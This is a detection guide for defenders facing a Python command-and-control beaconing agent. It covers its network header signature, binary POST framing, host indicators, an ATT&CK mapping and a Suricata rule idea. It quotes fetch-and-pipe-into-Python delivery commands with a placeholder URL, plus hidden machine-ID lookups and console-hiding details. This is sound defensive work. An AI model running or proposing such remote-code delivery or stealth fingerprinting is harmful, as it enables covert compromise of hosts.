# Defense Guide: python-agent

Detection guidance for defenders facing this agent, derived from its source
([`src/python-agent.py`](src/python-agent.py)). Everything below is observable; nothing
here is a bypass technique.

## Network indicators

- **Transport**: plain `urllib` POSTs to one endpoint (`H_URL`) on a repeating cadence — an
  immediate re-POST after every empty answer, so the flow is a steady request train rather
  than jittered polling (the relay's 20–30 s long-poll hold sets the pacing). Each request
  carries:
  - `Content-Type: application/octet-stream`
  - The full identity header set (API 1): `X-Device-Id`, `X-Session-Id`,
    `X-Device-Name`, `X-User-Id`, `X-Device-Arch`, `X-App-Arch`,
    `X-Platform` (`Windows` / `Linux` / `Darwin`), `X-OS-Version`, `X-OS-Build`,
    `X-Client-Id: 4`, `X-Client-Features: 0000000000000000` — a header cluster no
    legitimate software emits (detection-derived members are omitted when undetectable; there
    is no bitness header — the process arch carries the full width).
    **Any one of these on an internal POST is a high-confidence signature**; see the relay
    protocol docs for the full header semantics.
  - Log ships are the same POST with `X-Log-Only: 1`.
- **Body shape**: raw binary `[u32le length][bytes]` frames (v3). Small bodies (0–12 bytes for
  command replies) and Content-Length bodies that don't parse as text.
- **User-Agent**: the interpreter's default (`Python-urllib/3.x` on modern hosts) — a Python
  default UA POSTing binary frames to a non-API endpoint is itself a strong triage signal.

A Suricata rule keyed on the header cluster (`http.header; content:"X-Client-Features"`,
paired with `X-Client-Id: 4`) on egress covers the whole agent family with breed
disambiguation for free.

## Host indicators

- **Delivery pattern**: `curl <url> | python3`, `wget -qO- <url> | python`, or
  `python -c "exec(__import__('urllib...').urlopen('<url>').read())"` in shell histories and
  parent-process chains — the pipe-into-interpreter shape with a remote origin.
- **Identity lookups spawn hidden subprocesses** on some platforms: `reg query
  HKLM\SOFTWARE\Wow6432Node\Microsoft\Cryptography /v MachineGuid` (or the default-view twin,
  then `wmic csproduct get uuid`) on Windows, `ioreg -rd1 -c IOPlatformExpertDevice` on macOS —
  each launched with `STARTF_USESHOWWINDOW`/hidden-console `STARTUPINFO`, reading
  `/etc/machine-id` and `/sys/class/dmi/id/product_uuid` on Linux. A `python` process spawning
  `reg.exe`/`wmic.exe`/`ioreg` and discarding output is high-signal on a workstation.
- **No local output, ever**: the agent contains no `print` and no file writes — a
  long-running `python`/`pythonw` process with zero terminal output and a steady egress POST
  cadence is the behavioral sum.
- **File content**: if the delivered master is recovered (browser cache, disk), it is a
  self-contained obfuscated-or-plain Python text whose only top-level entry is `runAgent()`,
  preceded by an `os.environ['H_URL'] = '...'` assignment and (on Windows) a `ctypes`
  `ShowWindow(0)` console-hide mini. The C2's Python obfuscator additionally strips
  comments/docstrings and encodes string literals (hex escapes, `chr()` concatenation) —
  heavy `chr(` chains with `struct.pack` calls are characteristic.

## Behavioral summary

| Stage | Technique | MITRE ATT&CK |
|---|---|---|
| Delivery | Remote script piped into the interpreter | T1059.006 (Command and Scripting Interpreter: Python) |
| Persistence posture | Re-delivery driven (agent itself never persists) | — |
| Discovery | Machine UUID, hostname, username, arch enumeration | T1082, T1033, T1016 |
| C2 | Application-layer HTTP long-poll beaconing with binary frames | T1071.001 |
| Exfiltration-ready channel | Same framed POST bodies (relay-routed) | T1041 |

## Coverage notes

- Script-content inspection (EDR Python telemetry, AMSI-adjacent hooks on Windows hosts) sees
  the full master — obfuscation slows triage but the `H_URL` assignment and `runAgent` call
  remain structurally required.
- Auditd/execve monitoring on Linux catches the file reads only indirectly (no spawns there);
  the POST cadence and UA are the egress-side tells.
- The identity header cluster is the strongest shared signature across the whole agent family
  (JScript/C#/PowerShell/Python breeds) — one rule, parameterized by `X-Client-Id`.
